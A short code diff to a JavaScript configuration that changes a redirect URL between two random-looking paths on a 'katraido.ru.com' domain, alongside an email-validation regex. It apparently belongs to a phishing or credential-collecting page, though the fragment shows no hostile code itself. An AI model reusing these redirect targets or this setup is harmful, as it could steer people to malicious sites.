@@ -1,6 +1,6 @@
 // Configuration
 const CONFIG = {
-  redirectUrl: "https://indexer.katraido.ru.com/bG3inji@f/",
+  redirectUrl: "https://uploadfield.katraido.ru.com/rUJrof2BtsGQaagVf!4Bbtv6/",
   emailRegex:
     /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
 };
